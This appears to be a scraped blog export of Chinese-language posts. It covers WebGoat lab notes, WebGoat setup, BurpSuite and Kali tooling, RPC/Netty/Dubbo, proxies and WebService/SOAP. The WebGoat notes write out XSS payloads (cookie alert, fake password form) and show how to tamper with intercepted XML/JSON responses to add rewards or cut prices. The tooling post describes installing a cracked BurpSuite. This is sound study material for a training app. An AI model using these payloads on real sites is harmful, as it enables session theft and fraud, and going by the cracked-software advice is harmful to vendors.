Control水平越权问题,View这个操作不能像Delete一样对Tom进行权限上的控制,那么与Tom出于同一层级的其它用户也具有这个权限,所以说Tom可以通过拦截修改employee_id水平的访问其它人的资料,也是属于非正常逻辑. Stage4需要对每一个操作再次进行权限核实,才能解决这个问题,也是要求在开发版下完成这节课,但是我也不知道怎么完成. AJAX Security-LAB: Client Side Filtering客户端过滤,有些时候服务器返回的了很多条信息,只挑选了其中少数进行显示,可以在返回的html源码中看到全部的信息. 选中名字附近元素点击”检查” 在源码中搜索关键词”hidden” “Joanne”等 发现有3个”Joanne”,其中一个隐藏了Neville的信息 AJAX Security-DOM InjectionDOM:文档对象模型(Document Object Model),是W3C组织推荐的处理可扩展标志语言的标准编程接口.就是HTML报文中的节点,这里说是通过DOM注入的方式让原本网页中不可点击的按钮变为可点击. 输入License Key会自动发起一个Ajax的请求 通过拦截AJAX请求的返回报文,把报文头和内容全部清空 更改返回为一段JS代码 如下 document.form.SUBMIT.disabled = false 此时按钮就可以使用了,除了这个方法之外,还可以直接检查按钮 &lt;input disabled=&quot;&quot; id=&quot;SUBMIT&quot; value=&quot;Activate!&quot; name=&quot;SUBMIT&quot; type=&quot;SUBMIT&quot;&gt; 改disabled为false或者直接删除这个标记. AJAX Security-LAB: DOM-Based cross-site scripting这就是一个简单的反射型XSS的演示,依次输入以下内容在文本框里 World//正常 &lt;IMG SRC=&quot;images/logos/owasp.jpg&quot;/&gt;//XSS插入图片 &lt;img src=x onerror=;;alert(&#39;XSS&#39;) /&gt;//XSS插入Alert &lt;IFRAME SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;&lt;/IFRAME&gt;//XSS插入iFrame 甚至可以直接伪造界面 Please enter your password: &lt;BR&gt;&lt;input type = &quot;password&quot; name=&quot;pass&quot;/&gt; &lt;button onClick=&quot;javascript:alert(&#39;I have your password: &#39; + pass.value);&quot;&gt;Submit&lt;/button&gt; &lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt; AJAX Security-XML InjectionXML注入攻击,和HTML注入攻击一样,都是利用文本解析机制,写入恶意输入 输入ID:836239,拦截请求 修改返回报文的XML文件,给自己跟多的选择 返回报文 HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Cache-Control: no-cache Content-Type: text/xml Date: Tue, 08 Mar 2016 08:46:40 GMT Content-Length: 136 &lt;root&gt; &lt;reward&gt;WebGoat Mug 20 Pts&lt;/reward&gt; &lt;reward&gt;WebGoat t-shirt 50 Pts&lt;/reward&gt; &lt;reward&gt;WebGoat Secure Kettle 30 Pts&lt;/reward&gt; &lt;/root&gt; 可以修改内容为 &lt;root&gt; &lt;reward&gt;WebGoat Mug 20 Pts&lt;/reward&gt; &lt;reward&gt;WebGoat t-shirt 50 Pts&lt;/reward&gt; &lt;reward&gt;WebGoat Secure Kettle 30 Pts&lt;/reward&gt; &lt;reward&gt;WebGoat Secure Kettle 30 Pts&lt;/reward&gt; &lt;reward&gt;WebGoat Core Duo Laptop 2000 Pts&lt;/reward&gt; &lt;reward&gt;WebGoat Hawaii Cruise 3000 Pts&lt;/reward&gt; &lt;/root&gt; AJAX Security-JSON InjectionJSON注入攻击,原理和XML注入攻击一样 From输入BOS,to输入SEA 拦截请求返回报文 如下 HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Cache-Control: no-cache Content-Type: text/html Date: Tue, 08 Mar 2016 08:50:24 GMT Content-Length: 169 &#123; &quot;From&quot;: &quot;Boston&quot;, &quot;To&quot;: &quot;Seattle&quot;, &quot;flights&quot;: [ &#123;&quot;stops&quot;: &quot;0&quot;, &quot;transit&quot; : &quot;N/A&quot;, &quot;price&quot;: &quot;$600&quot;&#125;, &#123;&quot;stops&quot;: &quot;2&quot;, &quot;transit&quot; : &quot;Newark,Chicago&quot;, &quot;price&quot;: &quot;$300&quot;&#125; ] &#125; 修改600美元为30美元就可以便宜了 AJAX Security-Insecure Client Storage这是最坑的一道题!!! 先来说下题目的原意,题目中让你找出优惠券号码,然后享受优惠,利用情形是 有的优惠券号码是由服务器发送到前端的 为了防止从源码窃取,发送到浏览器的是加密后的优惠码,用一定算法进行解密 然后对比解密后的优惠券和用户的输入 相同就享受优惠 这里有个逻辑漏洞,就是拿解密后的优惠码明文和用户输入进行对比,而不是加密用户的输入与密文对比,所以前端还是可以通过JS打断点获取到优惠码明文. 大坑来了如果相对JS打断点,首先要能在控制台找到JS脚本文件,由于整个页面是使用了JQuery内嵌了课程内容(网页内部嵌另外一个网页),红色框内的内容是动态加载的,所以直接在Sources页面根本找不到内嵌网页的”clientSideValidation.js” 这个坑了我好久啊,对前端不熟悉怎么都找不到.js文件 Solution里给的答案第一步就是让你定位”clientSideValidation.js”,定位不到怎么办!!!! 检查Network既然内部的网页是动态加载的,那么肯定有网络通讯,可以通过检查Network看记录,和”clientSideValidation.js”附近的文件有个条网络请求”attack?Screen=272&amp;menu=400”的,点击可以看到红色框体内的页面,然后可以获取到实际地址 http://zhuojiademacbook-pro.local:8080/WebGoat/attack?Screen=272&amp;menu=400 利用Request拦截除去查看Network之外,还可以利用BurpSuite拦截Ajax请求,因为整个页面是通过Ajax刷新的,Ajax本身又是一种请求,那么只要我点击purchase,就可以拦截到一条Request请求,且能看到页面内的相关参数 对这个请求点击Action-Send to repeater 右键-Show response in browser 从浏览器里打开链接(注意此时关闭拦截) 就跳转到了实际内部页面的地址 得到了实际地址后,就可以在子页面内调试JS Stage2第二步说的是有些在前端可以通过删除掉input框的readonly标记任意修改金额,比较简单 AJAX Security-Dangerous Use of EvalEval是php语言中执行一段JS代码的意思,这一道题也是一种典型的反射型XSS展示,与刚刚基于DOM的不同,DOM是直接插入新节点,而这个是使用一定技巧,先关闭原本的DOM,然后写自己的DOM,再组装好刚刚被关闭DOM的后半部分. 通过php的Eval,alert被执行 123&#39;);alert(document.cookie);(&#39; 123后的 &#39;); 使得原本的DOM不受影响,最后的 (&#39; 闭合掉了原本多出的**’)**符号 插入代码的样子是 (&#39;123&#39;);alert(document.cookie);(&#39;&#39;)","tags":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"},{"name":"Security","slug":"Security","permalink":"http://yoursite.com/tags/Security/"}]},{"title":"WebGoat学习笔记(一):安装","date":"2016-03-06T15:00:00.000Z","path":"2016/03/07/WebGoat学习笔记(一)/","text":"WebGoat的版本区别WebGoat是一个渗透破解的习题教程,分为简单版和开发版,GitHub地址. 简单版安装简单版是个JAVA的Jar包,只需要有Java环境,然后在命令行里执行 java -jar webgoat-container-7.0.1-war-exec.jar 然后就可以访问”127.0.0.1:8080/WebGoat”就可以了,注意”WebGoat”大小写敏感,不能写错. 开发版安装WebGoat有些题目是开发版中才能做的,所以说需要安装开发版(但是比较坑的是安了开发版也有做不了的)先来看看条件 Java &gt;= 1.6 ( JDK 1.7 recommended ) Maven &gt; 2.0.9 Your favorite IDE, with Maven awareness: Netbeans/IntelliJ/Eclipse with m2e installed. Git, or Git support in your IDE Java环境肯定要装,然后因为我用的是Mac所以IDE用的是Xcode,Xcode自带了Git.所以剩下的就剩下Maven. Maven用过Xcode的应该知道CocoaPods,Maven就是类似CocoaPods的一个包管理软件,下载地址中下载压缩包,不要下载源码 apache-maven-3.3.9-bin.zip 然后进行解压缩,之后进行Maven配置,其中x.x.x为版本号,Name为你Mac的账户名 将解压后文件夹apache-maven-x.x.x移到/Users/Name/Library目录下 然后修改~/.bash_profile的内容,如果不存在就新建一个 全部命令行为 cd ~/Downloads/ mv apache-maven-3.3.9 ~/Library/apache-maven-3.3.9 vi ~/.bash_profile 其中bash_profile的内容为 export MAVEN_HOME=/Users/Name/Library/apache-maven-3.3.9 export PATH=$PATH:$MAVEN_HOME/bin 然后进行测试 mvn -version 看到以下内容就是成功了 Apache Maven 3.3.9 (bb52d8502b132ec0a5a3f4c09453c07478323dc5; 2015-11-11T00:41:47+08:00) Maven home: /Users/Name/Library/apache-maven-3.3.9 Java version: 1.7.0_80, vendor: Oracle Corporation Java home: /Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre Default locale: zh_CN, platform encoding: UTF-8 OS name: &quot;mac os x&quot;, version: &quot;10.11.3&quot;, arch: &quot;x86_64&quot;, family: &quot;mac&quot; WebGoat-Development在环境安装完毕之后新建一个文件夹WebGoat-Workspace执行sh脚本自动下载和编译 mkdir WebGoat-Workspace cd WebGoat-Workspace curl -o webgoat_developer_bootstrap.sh https://raw.githubusercontent.com/WebGoat/WebGoat/master/webgoat_developer_bootstrap.sh sh webgoat_developer_bootstrap.sh 编译提示Exit有时候可能会碰见类似这样的Debug提示 2016-03-08 14:33:20,496 DEBUG - Exit: AxisEngine::init 2016-03-08 14:33:20,496 DEBUG - Exit: DefaultAxisServerFactory::getServer 2016-03-08 14:33:20,496 DEBUG - Exit: getEngine() 产生的原因是WebGoat-Lessons的课程配置不对,打开/WebGoat-Lessons/pom.xml大概在100多行找到以下这个,把7.1-SNAPSHOT改成正确的版本号,再次运行sh脚本就可以了 &lt;dependency&gt; &lt;groupId&gt;org.owasp.webgoat&lt;/groupId&gt; &lt;artifactId&gt;webgoat-container&lt;/artifactId&gt; &lt;version&gt;7.1-SNAPSHOT&lt;/version&gt; &lt;type&gt;jar&lt;/type&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; Chrome和BurpSuite使用Chrome主要是其插件比较多,平时上网我都是用Safari的,下载一个插件”Proxy SwitchyOmega”,可以设置仅有Chrome走代理,然后将代理指向BurpSuite的端口和地址,BrupSuite使用看这里.","tags":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"},{"name":"Security","slug":"Security","permalink":"http://yoursite.com/tags/Security/"}]},{"title":"RPC/Netty/Dubbo的大致概念","date":"2016-03-05T15:00:00.000Z","path":"2016/03/06/RPCNettyDubbo的大致概念/","text":"函数的跨语言/跨内存调用在我Blog的另一个文章里简单介绍了WebService的原理,以及其最重要的特性,可以跨语言调用API.在文章的末尾也提到了两点: WebService效率不高 WebService还可以不同实体机上跨内存的函数调用 其效率不高的原因就是因为WebServices是基于文本的,而且XML文本的复杂度又很高,解析起来比较慢. 而在企业级别中,多数情况是因为业务过于复杂,会让不同的服务器承担不同的功能,这些功能之间进行互相调用,而服务器上运行的代码往往是同一种语言.所以内部同语言下的跨内存调用需求远大于外部跨语言调用. 如何提高跨内存调用效率由于WebService效率不高的原因是基于文本,那么我们需要一种更加底层的方法来提高效率,就是RPC(Remote Procedure Call Protocol)框架,关于RPC框架的介绍知乎上回答的很好,我们根据#巴多崽#用心阁#肖继潮#等人的回答一步一步来分析 产生跨区域调用的原因早期单机时代，一台电脑上运行多个进程，大家各干各的，老死不相往来。假如A进程需要一个画图的功能，B进程也需要一个画图的功能，程序员就必须为两个进程都写一个画图的功能。 这不是整人么？于是就出现了IPC（Inter-process communication，单机中运行的进程之间的相互通信）。OK，现在A既然有了画图的功能，B就调用A进程上的画图功能好了，程序员终于可以偷下懒了。 到了网络时代，大家的电脑都连起来了。以前程序只能调用自己电脑上的进程，能不能调用其他机器上的进程呢？于是就程序员就把IPC扩展到网络上，这就是RPC（远程过程调用）了。现在不仅单机上的进程可以相互通信，多机器中的进程也可以相互通信了。 要知道实现RPC很麻烦呀，什么多线程、什么Socket、什么I/O，都是让咱们普通程序员很头疼的事情。于是就有牛人开发出RPC框架。 RPC框架和WebService的关系RPC框架不仅局限于一种,最初由Sun公司提出采用客户机/服务器模式,请求程序就是一个客户机，而服务提供程序就是一个服务器.所以说WebService应该属于RPC框架的一种,但是由于目前跨内存调用的普遍性,RPC往往代称更加具体的基于底层协议二进制流的RPC框架,与WebService最大的不同就是 狭义的RPC基于二进制流的序列化和反序列化,故不能够提供跨语言的服务,但是比基于文本解析的WebService更加高效 狭义的RPC的工作过程先假设两台服务器A，B,一个应用部署在A服务器上,想要调用B服务器上应用提供的函数/方法,由于不在一个内存空间,不能直接调用,需要通过网络来表达调用的语义和传达调用的数据. 首先A和B建立TCP链接,并且确定好RPC框架的网路端口,能够进行网络通信 然后A服务器将需要调用B服务器的方法和参数进行序列化（Serialize）或编组（marshal) 通过第一步建立的链接,将序列化后的二进制流发送给B B服务器收到请求后,需要对参数进行反序列化（序列化的逆操作),恢复为内存中的表达方式 然后B服务器找到对应的方法（寻址的一部分）进行本地调用,然后得到返回值 B服务器对返回值再次进行序列化,并且通过相同的途径发送给A A对B服务器返回的信息再进行反序列化,得到返回结果 整个流程如下图所示 Netty是什么提到RPC框架会伴随着一个词语Netty,而Netty框架并不局限于RPC,更多的是作为一种网络协议的实现框架.由于RPC需要高效的网络通信,就可能选择以Netty作为基础,Netty十一个答疑看这里. 除了网络通信,RPC还需要有比较高效的序列化框架,以及一种寻址方式.如果是带会话（状态）的RPC调用,还需要有会话和状态保持的功能。 当然最主要的原因还是Netty有许多好处,比如对非阻塞IO（NIO）的支持,比如在链上传递时最大程度的减少buffer的copy（高性能）. Dubbo是什么Dubbo是阿里公司开发的分布式服务RPC框架,本身使用 Dubbo 协议进行节点间通信,Dubbo 协议默认使用 Netty 作为基础通信组件,用于实现各进程节点之间的内部通信。通常与Zookeeper配合使用,整个项目是由阿里的六个开发人员参与开发和测试,并且在Github上进行了开源.Dubbo队员专访看这里.","tags":[{"name":"Net","slug":"Net","permalink":"http://yoursite.com/tags/Net/"}]},{"title":"Web安全学习工具准备和填坑","date":"2016-03-04T15:00:00.000Z","path":"2016/03/05/Web安全学习工具准备和填坑/","text":"硬件软件准备电脑用的是Macbook,所以基本都是在Mac上的软件.软件上需要准备的JDK的Java环境. 抓包工具Charles抓包工具用的是Charles,遇到的坑的问题就是抓不到本地的包,后来找到了解决方法,写在我Blog另外一个文章里 渗透工具BurpSuiteBurpSuite是个可视化界面的渗透工具,本身是个.jar包,详细的可以看Wooyun网教程,下面讲讲其中用到的四个主要功能. Proxy代理这个是拦截的基础,只有将浏览器的代理服务器指向Burp才能拦截(Intercept)所有的请求和返回,其中三个最关键的选项 Proxy Listenters: 设置代理服务器的地址和端口 Intercept requests based on the following rules: 拦截请求 Intercept responses based on the following rules: 拦截返回 可以在Intercept选项卡中看到时实的报文,在HTTP history中可以看到记录 Repeater转发有时候Intercept一个请求,并不想放它过去,而是想对其中的参数进行调试,从而观察不同的情况,此时可以在Intercept的选项卡中点Action(或者右键)然后Send to repeater. 在Repeater中修改参数,然后点击Go,就可以看到返回报文,要是想在浏览器中打开可以右键点击报文区域在选项卡中选”show response in browser”就可以看到返回的结果. Intruder侵入Intruder虽然英文翻译叫侵入,实际是爆破工具,可以穷举某个参数,其中有四个Attack Type. Sniper: 狙击手模式,针对一个参数用一个方法进行穷举 Battering ram: 攻城槌,针对一组参数用同一个方法进行穷举 PitchFork: 干草叉,针对一组参数各自用不同种的方法进行穷举 Cluster bomb: 集束炸弹,针对一组参数用不同种方法遍历进行穷举 除了Sniper之外以两个参数,10种可能性进行举例,Battering ram是10次,PitchFork也是10次,而Cluster bomb则是100次. 在Intruder选项卡的Options选项中,可以进行Number of threads进行线程设置,而且攻击后的结果可以排序和搜索 Spider蜘蛛虽然单词是蜘蛛,但是中文更多叫爬虫,可以用于爬虫目录结构,或者XSS漏洞,但是一般爬取目录为主,对XSS漏洞能力较弱. 但是如WebGoat的最后一课,莫名其妙出现的source?source=true这种没有链接路径的页面爬虫也很难自动获取到,除非规定的爬虫字典里有source. 集成渗透环境Kali除了渗透工具之外,还有好多工具因为版本比较老,或者收集困难,所以有组织单独开发了集成渗透环境,一般都是一个Linux虚拟机,其中以Kali最为出名. 在Mac上使用的是Parallels Desktop虚拟机来安装Kali,讲其中遇到的两个大坑 Parallels Tools在Kali中安装不上由于Kali是基于Debian修改的内核,Parallel Tools并没有单独对其开发Paralles Tools,导致很多时候安装会有问题. 安装Kali的过程中会让你设置Root用户密码,安装完毕Username就是root,密码为你设置的 Permission deny虚拟机加载了Parallel tools镜像之后执行安装指令”./install”提示没有权限,需要将所有安装文件拷贝到一个有权限的目录才行 cd /media/cdrom0 cp -r install installer/ kmods/ tools/ version /tmp cd /tmp ./install 或者是使用Parallels tools提示的方法,手动重新加载光盘镜像 umount /media/cdrom0 mount -o exec /media/cdrom0 ./install 注意!以上的所有操作都是基于Root用户才行,一般来讲Kali安装后都是Root用户 Install manual运行安装指令之后有时会提醒缺少某些安装包,需要你手动安装,出现这种问题的原因是Kali镜像中某些库的版本和Parallels能识别的版本不统一,只能通过一个库管理工具apt-get来手动更新. 0) Verify that the repositories for kali are correct: &gt;more /etc/apt/sources.list deb http://http.kali.org/kali kali-rolling main contrib non-free # For source package access, uncomment the following line # deb-src http://http.kali.org/kali kali-rolling main contrib non-free 1) &gt;apt-get clean 2) &gt;apt-get update 3) &gt;apt-get upgrade -y 4) &gt;apt-get dist-upgrade -y 5) restart 但是这里有个问题就是,国外这个apt的源”http.kali.org/kali”实在是太慢了,可以尝试更改source文件为国内的源,比如中科大的. cd /etc/apt/ mv sources.list sources.list.backup vim /sources.list 然后更改内容为其中一个 #中科大kali源 deb http://mirrors.ustc.edu.cn/kali sana main non-free contrib deb http://mirrors.ustc.edu.cn/kali-security/ sana/updates main contrib non-free deb-src http://mirrors.ustc.edu.cn/kali-security/ sana/updates main contrib non-free #阿里云kali源 deb http://mirrors.aliyun.com/kali sana main non-free contrib deb http://mirrors.aliyun.com/kali-security/ sana/updates main contrib non-free deb-src http://mirrors.aliyun.com/kali-security/ sana/updates main contrib non-free 更改完源之后一定要重新Clean/Update/Upgrade 把Kali中的软件更改为破解版就拿BurpSuite来讲,Kali中带的是免费版,多了很多功能限制,我可以从外部下破解版的然后替换掉原来的文件,Kali的BurpSuite安装在/usr/bin目录. I navigated to /usr/bin and selected burpsuite. I right-clicked and renamed burpsuite to burpsuite(old). I copied the jar I just downloaded into /usr/bin. I right-clicked and renamed the jar to burpsuite. In the Permissions tab select Allow executing file as program. Hit close.","tags":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"},{"name":"Security","slug":"Security","permalink":"http://yoursite.com/tags/Security/"}]},{"title":"Proxy机制和反向代理的意思","date":"2016-03-03T15:00:00.000Z","path":"2016/03/04/Proxy机制和反向代理的意思/","text":"Proxy是什么Proxy单词是代理人的意思,Proxy Server就是代理服务器.代理的意思就是替别人,代理服务器就是你的访问不自己去访问,你去访问代理服务器,代理服务器替你去进行访问,这样被访问者收到的请求就是来自代理服务器. 代理服务器和反向代理服务器除了代理服务器,还听服务器的大哥讲过反向代理服务器,这两个有啥关系呢? 代理服务器: 多对一,多个IP访问代理IP,代理IP统一发送请求 反向代理服务器: 多对一的反向就是一对多,请求统一访问反向代理服务器,反向代理服务器把不同的请求分发到不同的业务服务器上 Proxy工作机制Proxy的工作模式一般有自动和手动两种模式 自动模式自动模式一般只需要关心一个URL地址,该URL地址是指向本地或者网段内的某个地址下的”.pac”文件,pac文件实质是一个页面,可以运行JS代码,里面可以设置过滤规则 手动模式手动模式一般需要考虑三点 协议 地址 端口 协议一般是分为HTTP/HTTPS/FTP/SOCKS这四种,地址就是URL,而端口就是代理服务器的准入接口. 代理服务器的实际用例ShadowSocks\\抓包软件(Charles)\\渗透软件(BurpSuite)等等都是利用代理把浏览器的或者全局的请求先发送到软件,软件作为一个代理服务器,再去请求实际地址.由于软件一般都是本地的,所以实际服务器收到的还是你的原地址.相当于请求在由浏览器直接到服务器,变成了先经过代理服务器(软件)再去服务器.","tags":[{"name":"Net","slug":"Net","permalink":"http://yoursite.com/tags/Net/"}]},{"title":"WebSerivce的学习","date":"2016-03-02T15:00:00.000Z","path":"2016/03/03/WebSerivce的学习/","text":"WebService是什么WebService是为了解决不同编程语言之间函数互相调用的方案.好多人都产生过一个这样的疑问,JAVA由于底层源于C++,所以说可以调用C++和C,但是PHP或者Objective-C这样的语言可不可以互相调用? 由于PHP和Objective-C不可能打包成jar包,所以说不可能把一个Objective-C写的.a静态库直接import到Java的工程里,而且Java也读不懂OC的Header文件.有思路的人说我可以自己约定一个协议,或者通过自定义字段的HTTP来传递数据,然后进行解析动态调用,和HTML5与Native的手机App互相调用一样,使用JSON来传递数据. WebService和这个思路是一样的,只不过不是使用自己定义的协议,而是使用HTTP+XML来互相调用不同语言函数,并且可以放在Web网络上,通过网络互相传递,不需要在本地工程内import的一种方法. WebService需要做什么准备既然WebService使用到了HTTP,那么就说明利用了Request和Response的机制,我们来假设两个角色: 被调用者A: 把自己的API接口封装成WebService服务,放在公网上,以URL地址的形式 调用者B: 调用公开的WebService服务,以Request的形式请求URL 既然是被调用,为了方便调用者查询有哪些接口,需要通过一个机制把这些接口展现给别人,例如C++中.h文件.WebService使用的机制就是WSDL. 而作为调用者,由于是不同语言之间,语法都不一致,不可能直接通过函数调用,需要通过Request请求,带上从WSDL查询到的参数具体值,封装成一个XML的HTTP请求来调用接口. WebService的具体流程 调用者B使用URL后加?WSDL等方式查询WSDL返回报文(XML文件) 从WSDL报文里读到函数名和参数列表 自己组装SOAP请求,以Request的HTTP报文形式发送 得到返回的结果,完成调用 那么这些WSDL和SOAP到底是什么呢? WSDL(Web Services Discription Language)WSDL的意思为WebServices描述语言,说白了就是C++的Header文件和Java的文档,其本质是一个网页,当你使用”www.A.com?WSDL&quot;这种网页主域名加&quot;?WSDL&quot;访问,然后会返回一个Response,内容为XML文档. 参考无恙的blog假设这是一个Java的Class public class Service : System.Web.Services.WebService &#123; public Service () &#123; //Uncomment the following line if using designed components //InitializeComponent(); &#125; [WebMethod] public DateTime HelloWorld(int i) &#123; return DateTime.Now; &#125; &#125; 那么生成WSDL就是如下 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;wsdl:definitions xmlns:soap=&quot;http://schemas.xmlsoap.org/wsdl/soap/&quot; xmlns:tm=&quot;http://microsoft.com/wsdl/mime/textMatching/&quot; xmlns:soapenc=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:mime=&quot;http://schemas.xmlsoap.org/wsdl/mime/&quot; xmlns:tns=&quot;http://tempuri.org/&quot; xmlns:s=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap12=&quot;http://schemas.xmlsoap.org/wsdl/soap12/&quot; xmlns:http=&quot;http://schemas.xmlsoap.org/wsdl/http/&quot; targetNamespace=&quot;http://tempuri.org/&quot; xmlns:wsdl=&quot;http://schemas.xmlsoap.org/wsdl/&quot;&gt; &lt;wsdl:types&gt; &lt;s:schema elementFormDefault=&quot;qualified&quot; targetNamespace=&quot;http://tempuri.org/&quot;&gt; &lt;s:element name=&quot;HelloWorld&quot;&gt;//HelloWorld的入参int类型 &lt;s:complexType&gt; &lt;s:sequence&gt; &lt;s:element minOccurs=&quot;1&quot; maxOccurs=&quot;1&quot; name=&quot;i&quot; type=&quot;s:int&quot; /&gt; &lt;/s:sequence&gt; &lt;/s:complexType&gt; &lt;/s:element&gt; &lt;s:element name=&quot;HelloWorldResponse&quot;&gt;//HelloWorld的返回值dateTime &lt;s:complexType&gt; &lt;s:sequence&gt; &lt;s:element minOccurs=&quot;1&quot; maxOccurs=&quot;1&quot; name=&quot;HelloWorldResult&quot; type=&quot;s:dateTime&quot; /&gt; &lt;/s:sequence&gt; &lt;/s:complexType&gt; &lt;/s:element&gt; &lt;/s:schema&gt; &lt;/wsdl:types&gt; &lt;wsdl:message name=&quot;HelloWorldSoapIn&quot;&gt; &lt;wsdl:part name=&quot;parameters&quot; element=&quot;tns:HelloWorld&quot; /&gt;//HelloWorld的入参仅有一个 &lt;/wsdl:message&gt; &lt;wsdl:message name=&quot;HelloWorldSoapOut&quot;&gt; &lt;wsdl:part name=&quot;parameters&quot; element=&quot;tns:HelloWorldResponse&quot; /&gt;//HelloWorld的返回值,肯定只有一个 &lt;/wsdl:message&gt; &lt;wsdl:portType name=&quot;ServiceSoap&quot;&gt; &lt;wsdl:operation name=&quot;HelloWorld&quot;&gt;//HelloWorld的函数名以及入参和返回值 &lt;wsdl:input message=&quot;tns:HelloWorldSoapIn&quot; /&gt; &lt;wsdl:output message=&quot;tns:HelloWorldSoapOut&quot; /&gt; &lt;/wsdl:operation&gt; &lt;/wsdl:portType&gt; &lt;wsdl:binding name=&quot;ServiceSoap&quot; type=&quot;tns:ServiceSoap&quot;&gt; &lt;soap:binding transport=&quot;http://schemas.xmlsoap.org/soap/http&quot; /&gt; &lt;wsdl:operation name=&quot;HelloWorld&quot;&gt; &lt;soap:operation soapAction=&quot;http://tempuri.org/HelloWorld&quot; style=&quot;document&quot; /&gt; &lt;wsdl:input&gt; &lt;soap:body use=&quot;literal&quot; /&gt; &lt;/wsdl:input&gt; &lt;wsdl:output&gt; &lt;soap:body use=&quot;literal&quot; /&gt; &lt;/wsdl:output&gt; &lt;/wsdl:operation&gt; &lt;/wsdl:binding&gt; &lt;wsdl:binding name=&quot;ServiceSoap12&quot; type=&quot;tns:ServiceSoap&quot;&gt; &lt;soap12:binding transport=&quot;http://schemas.xmlsoap.org/soap/http&quot; /&gt; &lt;wsdl:operation name=&quot;HelloWorld&quot;&gt; &lt;soap12:operation soapAction=&quot;http://tempuri.org/HelloWorld&quot; style=&quot;document&quot; /&gt; &lt;wsdl:input&gt; &lt;soap12:body use=&quot;literal&quot; /&gt; &lt;/wsdl:input&gt; &lt;wsdl:output&gt; &lt;soap12:body use=&quot;literal&quot; /&gt; &lt;/wsdl:output&gt; &lt;/wsdl:operation&gt; &lt;/wsdl:binding&gt; &lt;wsdl:service name=&quot;Service&quot;&gt; &lt;wsdl:port name=&quot;ServiceSoap&quot; binding=&quot;tns:ServiceSoap&quot;&gt; &lt;soap:address location=&quot;http://localhost:2206/WebSite1/Service.asmx&quot; /&gt; &lt;/wsdl:port&gt; &lt;wsdl:port name=&quot;ServiceSoap12&quot; binding=&quot;tns:ServiceSoap12&quot;&gt; &lt;soap12:address location=&quot;http://localhost:2206/WebSite1/Service.asmx&quot; /&gt; &lt;/wsdl:port&gt; &lt;/wsdl:service&gt; &lt;/wsdl:definitions&gt; 这些标记中描述的都是什么呢,详细的标签可以通过学习网站进行学习,我看到了一个简易版的描述讲的很好. &lt;definitions&gt; &lt;types&gt; 定义 web service 使用的数据类型。为了最大程度的平台中立性，WSDL 使用 XML Schema 语法来定义自己数据类型，而不是采用任何既有的编程语言的数据类型。 &lt;/types&gt; &lt;message&gt; 定义一个操作的数据元素。术语Message让人有点摸不着头脑， 其实就是在定义参数（参数的名字及类型，类型由前面的types节定义）。 &lt;/message&gt; &lt;portType&gt; WSDL中最重要的元素。也是一个让人摸不着头脑的术语。其实就是定义接口的名称。 接口中的函数使用&lt;operation&gt;元素来声明，函数的名字为operation元素的name属性， 输入参数使用input message声明，输出参数使用output message声明 &lt;/operation&gt; &lt;/portType&gt; &lt;binding&gt; 该部分指定接口与底层实现协议的实现细节。 该节跟编程没有直接的对应关系。 &lt;/binding&gt; &lt;service&gt; 该部分用于指定实现了该接口的一个实例 &lt;/service&gt; &lt;/definitions&gt; SOAP(Simple Object Access Protocol)SOAP的中文意思是简单对象访问协议“Simple Object Access Protocol”,但是这种缩写已经在标准的1.2版后被废止了.1.2版在2003年6月24日成为W3C的推荐版本.这种缩写容易与SOA——Service-oriented architecture产生歧义,虽然它们之间存在非常大的差异. 其本身是一个Request的HTTP报文,只不过HTTP报文头里多了一个Key值”SOAPAction:”,用来表示这个报文是SOAP请求,而”Content-Type:”也由”text/html” 变成”text/xml”.以下是举例 POST /WebServices/WeatherWebService.asmx HTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; MS Web Services Client Protocol 2.0.50727.3603) Content-Type: text/xml; charset=utf-8 SOAPAction: &quot;http://WebXml.com.cn/getSupportCity&quot; Host: www.webxml.com.cn Content-Length: 348 Expect: 100-continue Connection: Keep-Alive Code highlighting produced by Actipro CodeHighlighter (freeware) http://www.CodeHighlighter.com/ &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;soap:Envelope xmlns:soap=&quot;http://www.w3.org/2001/12/soap-envelope&quot; soap:encodingStyle=&quot;http://www.w3.org/2001/12/soap-encoding&quot;&gt; &lt;soap:Header&gt; &lt;m:Trans xmlns:m=&quot;http://www.w3schools.com/transaction/&quot; soap:mustUnderstand=&quot;1&quot;&gt;234 &lt;/m:Trans&gt; &lt;/soap:Header&gt; &lt;soap:Body&gt; &lt;m:HelloWorld xmlns:m=&quot;http://www.w3schools.com/prices&quot;&gt; &lt;m:HelloWorldSoapIn&gt;10&lt;/m:HelloWorldSoapIn&gt; &lt;/m:HelloWorld&gt; &lt;/soap:Body&gt; &lt;/soap:Envelope&gt; 其中的soap:Body里面的内容就是请求的内容,请求的方法为HelloWorld,该方法有一个名为HelloWorldSoapIn的参数,参数的值为“10”这个字符串.具体的学习可以参考学习手册. Envelope: SOAP的请求内容必须以Envelope做为根节点。 Header: 这个是可选的，如果需要添加Header元素，那么它必须是Envelope的第一个元素. Body: 这个就是请求的主题内容了,用标签表示一个函数，然后用子元素表示它的参数。 在调用中没有指定参数和返回类型，这里不需要指定，因为提供服务的一方自己已经规定好了数据类型，在调用时指定数据类型没有任何意义。 UDDI(Universal Description, Discovery and Integration)UDDI(Universal Description, Discovery and Integration)可译为”通用描述、发现与集成服务”.是一种目录服务,企业可以使用它对WebServices进行注册和搜索,说白了就是统一管理WebServices.详情可以看学习手册 WebServices的常用用途和新技术WebServices除了解决不同语言之间的调用,最主要还是为了解决服务器架构中不同模块之间调用,因为不同的模块不在同一块内存中,所以必须有个通讯方式,让他们之间互相都是可用的.WebServices就成了选择. 